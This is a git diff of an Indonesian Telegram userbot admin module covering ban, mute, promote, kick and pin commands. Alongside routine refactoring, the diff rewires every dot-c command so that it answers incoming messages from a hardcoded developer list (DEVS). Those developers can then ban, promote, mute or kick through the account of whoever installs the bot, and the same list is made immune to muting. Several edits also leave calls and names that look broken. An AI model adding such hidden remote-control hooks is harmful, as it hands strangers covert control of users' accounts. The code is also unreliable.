@@ -2,8 +2,12 @@
 #
 # Licensed under the Raphielscape Public License, Version 1.c (the "License");
 # you may not use this file except in compliance with the License.
+#
+# Ported @mrismanaziz
+# FROM Man-Userbot
+# Recode by @Pocongonlen
 
-
+import logging
 from asyncio import sleep
 
 from telethon.errors import (
@@ -40,9 +44,9 @@ from userbot.utils import (
     edit_or_reply,
     get_user_from_event,
     poci_cmd,
+    man_handler,
     media_type,
 )
-from userbot.utils.logger import logging
 
 # =================== CONSTANT ===================
 PP_TOO_SMOL = "**Gambar Terlalu Kecil**"
@@ -75,6 +79,11 @@ UNBAN_RIGHTS = ChatBannedRights(
     send_inline=None,
     embed_links=None,
 )
+logging.basicConfig(
+    format="[%(levelname)s- %(asctime)s]- %(name)s- %(message)s",
+    level=logging.INFO,
+    datefmt="%H:%M:%S",
+)
 
 LOGS = logging.getLogger(__name__)
 MUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=True)
@@ -83,7 +92,6 @@ UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 
 
 @poci_cmd(pattern="setgpic( -s| -d)$")
-@register(pattern=r"^\.csetgpic( -s| -d)$", sudo=True)
 async def set_group_photo(event):
     "For changing Group dp"
     flag = (event.pattern_match.group(1)).strip()
@@ -120,7 +128,7 @@ async def set_group_photo(event):
 
 
 @poci_cmd(pattern="promote(?:\s|$)([\s\S]*)")
-@register(pattern=r"^\.cpromote(?:\s|$)([\s\S]*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?:\s|$)([\s\S]*)")
 async def promote(event):
     new_rights = ChatAdminRights(
         add_admins=False,
@@ -145,7 +153,7 @@ async def promote(event):
 
 
 @poci_cmd(pattern="demote(?:\s|$)([\s\S]*)")
-@register(pattern=r"^\.cdemote(?:\s|$)([\s\S]*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?:\s|$)([\s\S]*)")
 async def demote(event):
     "To demote a person in group"
     user, _ = await get_user_from_event(event)
@@ -170,9 +178,9 @@ async def demote(event):
 
 
 @poci_cmd(pattern="ban(?:\s|$)([\s\S]*)")
-@register(pattern=r"^\.cban(?:\s|$)([\s\S]*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cban(?:\s|$)([\s\S]*)")
 async def ban(bon):
-    hantu = await bon.client.get_me()
+    await bon.get_me()
     chat = await bon.get_chat()
     admin = chat.admin_rights
     creator = chat.creator
@@ -182,46 +190,48 @@ async def ban(bon):
     user, reason = await get_user_from_event(bon)
     if not user:
         return
-    pocong = await edit_or_reply(bon, "`Processing Banned...`")
+    await edit_or_reply(bon, "`Processing Banned...`")
     try:
         await bon.client(EditBannedRequest(bon.chat_id, user.id, BANNED_RIGHTS))
     except BadRequestError:
         return await edit_or_reply(bon, NO_PERM)
     if reason:
-        await pocong.edit(
+        await edit_or_reply(
+            bon,
             r"\\**#Banned_User**//"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{str(user.id)}`\n"
             f"**Reason:** `{reason}`",
         )
     else:
-        await pocong.edit(
-            f"\\\\**#Banned_User**//\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n**User ID:** `{user.id}`\n**Action:** `Banned User by {hantu.first_name}`",
+        await edit_or_reply(
+            bon,
+            f"\\\\**#Banned_User**//\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n**User ID:** `{user.id}`\n**Action:** `Banned User by {owner}`",
         )
 
 
 @poci_cmd(pattern="unban(?:\s|$)([\s\S]*)")
-@register(pattern=r"^\.cunban(?:\s|$)([\s\S]*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban(?:\s|$)([\s\S]*)")
 async def nothanos(unbon):
     chat = await unbon.get_chat()
     admin = chat.admin_rights
     creator = chat.creator
     if not admin and not creator:
         return await edit_delete(unbon, NO_ADMIN)
-    pocong = await edit_or_reply(unbon, "`Processing...`")
+    await edit_or_reply(unbon, "`Processing...`")
     user = await get_user_from_event(unbon)
     user = user[0]
     if not user:
         return
     try:
         await unbon.client(EditBannedRequest(unbon.chat_id, user.id, UNBAN_RIGHTS))
-        await edit_delete(pocong, "`Unban Berhasil Dilakukan!`")
+        await edit_delete(unbon, "`Unban Berhasil Dilakukan!`")
     except UserIdInvalidError:
-        await edit_delete(pocong, "`Sepertinya Terjadi ERROR!`")
+        await edit_delete(unbon, "`Sepertinya Terjadi ERROR!`")
 
 
 @poci_cmd(pattern="mute(?: |$)(.*)")
-@register(pattern=r"^\.cmute(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cmute(?: |$)(.*)")
 async def spider(spdr):
     try:
         from userbot.modules.sql_helper.spam_mute_sql import mute
@@ -232,46 +242,49 @@ async def spider(spdr):
     creator = chat.creator
     if not admin and not creator:
         return await edit_or_reply(spdr, NO_ADMIN)
-    pocong = await edit_or_reply(spdr, "`Processing...`")
     user, reason = await get_user_from_event(spdr)
     if not user:
         return
     self_user = await spdr.client.get_me()
     if user.id == self_user.id:
-        return await edit_or_reply(pocong, "**Tidak Bisa Membisukan Diri Sendiri..（>﹏<）**"
+        return await edit_or_reply(
+            spdr, "**Tidak Bisa Membisukan Diri Sendiri..（>﹏<）**"
         )
     if user.id in DEVS:
-        return await pocong.edit("**Gagal Mute, Dia Adalah Pembuat Saya 🤪**")
-    await pocong.edit(
+        return await edit_or_reply(spdr, "**Gagal Mute, Dia Adalah Pembuat Saya 🤪**")
+    await edit_or_reply(
+        spdr,
         r"\\**#Muted_User**//"
         f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
         f"**User ID:** `{user.id}`\n"
         f"**Action:** `Mute by {owner}`",
     )
     if mute(spdr.chat_id, user.id) is False:
-        return await edit_delete(pocong, "**ERROR:** `Pengguna Sudah Dibisukan.`")
+        return await edit_delete(spdr, "**ERROR:** `Pengguna Sudah Dibisukan.`")
     try:
         await spdr.client(EditBannedRequest(spdr.chat_id, user.id, MUTE_RIGHTS))
         if reason:
-            await pocong.edit(
+            await edit_or_reply(
+                spdr,
                 r"\\**#Mute_User**//"
                 f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
                 f"**User ID:** `{user.id}`\n"
                 f"**Reason:** `{reason}`",
             )
         else:
-            await pocong.edit(
+            await edit_or_reply(
+                spdr,
                 r"\\**#Mute_User**//"
                 f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
                 f"**User ID:** `{user.id}`\n"
                 f"**Action:** `Mute by {owner}`",
             )
     except UserIdInvalidError:
-        return await edit_delete(pocong, "**Terjadi ERROR!**")
+        return await edit_delete(spdr, "**Terjadi ERROR!**")
 
 
 @poci_cmd(pattern="unmute(?: |$)(.*)")
-@register(pattern=r"^\.cunmute(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunmute(?: |$)(.*)")
 async def unmoot(unmot):
     chat = await unmot.get_chat()
     admin = chat.admin_rights
@@ -282,7 +295,7 @@ async def unmoot(unmot):
         from userbot.modules.sql_helper.spam_mute_sql import unmute
     except AttributeError:
         return await unmot.edit(NO_SQL)
-    pocong = await edit_or_reply(unmot, "`Processing...`")
+    await edit_or_reply(unmot, "`Processing...`")
     user = await get_user_from_event(unmot)
     user = user[0]
     if not user:
@@ -292,12 +305,12 @@ async def unmoot(unmot):
         return await edit_delete(unmot, "**ERROR! Pengguna Sudah Tidak Dibisukan.**")
     try:
         await unmot.client(EditBannedRequest(unmot.chat_id, user.id, UNBAN_RIGHTS))
-        await edit_delete(pocong, "**Berhasil Melakukan Unmute!**")
+        await edit_delete(unmot, "**Berhasil Melakukan Unmute!**")
     except UserIdInvalidError:
-        return await edit_delete(pocong, "**Terjadi ERROR!**")
+        return await edit_delete(unmot, "**Terjadi ERROR!**")
 
 
-@pocong_handler()
+@man_handler()
 async def muter(moot):
     try:
         from userbot.modules.sql_helper.gmute_sql import is_gmuted
@@ -329,7 +342,7 @@ async def muter(moot):
 
 
 @poci_cmd(pattern="ungmute(?: |$)(.*)")
-@register(pattern=r"^\.cungmute(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     chat = await un_gmute.get_chat()
     admin = chat.admin_rights
@@ -340,20 +353,19 @@ async def ungmoot(un_gmute):
         from userbot.modules.sql_helper.gmute_sql import ungmute
     except AttributeError:
         return await edit_delete(un_gmute, NO_SQL)
-    pocong = await edit_or_reply(un_gmute, "`Processing...`")
     user = await get_user_from_event(un_gmute)
     user = user[0]
     if not user:
         return
-    await pocong.edit("`Membuka Global Mute Pengguna...`")
+    await edit_or_reply(un_gmute, "`Membuka Global Mute Pengguna...`")
     if ungmute(user.id) is False:
-        await pocong.edit("**ERROR!** Pengguna Sedang Tidak Di Gmute.")
+        await un_gmute.edit("**ERROR!** Pengguna Sedang Tidak Di Gmute.")
     else:
         await edit_delete(un_gmute, "**Berhasil! Pengguna Sudah Tidak Dibisukan**")
 
 
 @poci_cmd(pattern="gmute(?: |$)(.*)")
-@register(pattern=r"^\.cgmute(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgmute(?: |$)(.*)")
 async def gspider(gspdr):
     chat = await gspdr.get_chat()
     admin = chat.admin_rights
@@ -364,27 +376,32 @@ async def gspider(gspdr):
         from userbot.modules.sql_helper.gmute_sql import gmute
     except AttributeError:
         return await gspdr.edit(NO_SQL)
-    pocong = await edit_or_reply(gspdr, "`Processing...`")
     user, reason = await get_user_from_event(gspdr)
     if not user:
         return
     self_user = await gspdr.client.get_me()
     if user.id == self_user.id:
-        return await pocong.edit("**Tidak Bisa Membisukan Diri Sendiri..（>﹏<）**")
+        return await edit_or_reply(
+            gspdr, "**Tidak Bisa Membisukan Diri Sendiri..（>﹏<）**"
+        )
     if user.id in DEVS:
-        return await pocong.edit("**Gagal Global Mute, Dia Adalah Pembuat Saya 🤪**")
-    await pocong.edit("**Berhasil Membisukan Pengguna!**")
+        return await edit_or_reply(
+            gspdr, "**Gagal Global Mute, Dia Adalah Pembuat Saya 🤪**"
+        )
+    await edit_or_reply(gspdr, "**Berhasil Membisukan Pengguna!**")
     if gmute(user.id) is False:
         await edit_delete(gspdr, "**ERROR! Pengguna Sudah Dibisukan.**")
     elif reason:
-        await pocong.edit(
+        await edit_or_reply(
+            gspdr,
             r"\\**#GMuted_User**//"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{user.id}`\n"
             f"**Reason:** `{reason}`",
         )
     else:
-        await pocong.edit(
+        await edit_or_reply(
+            gspdr,
             r"\\**#GMuted_User**//"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{user.id}`\n"
@@ -464,12 +481,12 @@ async def get_admin(show):
             else:
                 mentions += f"\n⚜ Akun Terhapus <code>{user.id}</code>"
     except ChatAdminRequiredError as err:
-        mentions += f" {str(err)}" + "\n"
+        mentions += " " + str(err) + "\n"
     await show.edit(mentions, parse_mode="html")
 
 
 @poci_cmd(pattern="pin( loud|$)")
-@register(pattern=r"^\.cpin( loud|$)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cpin( loud|$)")
 async def pin(event):
     to_pin = event.reply_to_msg_id
     if not to_pin:
@@ -486,7 +503,7 @@ async def pin(event):
 
 
 @poci_cmd(pattern="unpin( all|$)")
-@register(pattern=r"^\.cunpin( all|$)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunpin( all|$)")
 async def pin(event):
     to_unpin = event.reply_to_msg_id
     options = (event.pattern_match.group(1)).strip()
@@ -515,7 +532,7 @@ async def pin(event):
 
 
 @poci_cmd(pattern="kick(?: |$)(.*)")
-@register(pattern=r"^\.ckick(?: |$)(.*)", sudo=True)
+@register(incoming=True, from_users=DEVS, pattern=r"^\.ckick(?: |$)(.*)")
 async def kick(usr):
     chat = await usr.get_chat()
     admin = chat.admin_rights
@@ -530,7 +547,7 @@ async def kick(usr):
         await usr.client.kick_participant(usr.chat_id, user.id)
         await sleep(0.5)
     except Exception as e:
-        return await edit_delete(usr, f"{NO_PREM}\n{e}")
+        return await edit_delete(usr, NO_PERM + f"\n{e}")
     if reason:
         await xxnx.edit(
             f"[{user.first_name}](tg://user?id={user.id}) **Telah Dikick Dari Grup**\n**Alasan:** `{reason}`"
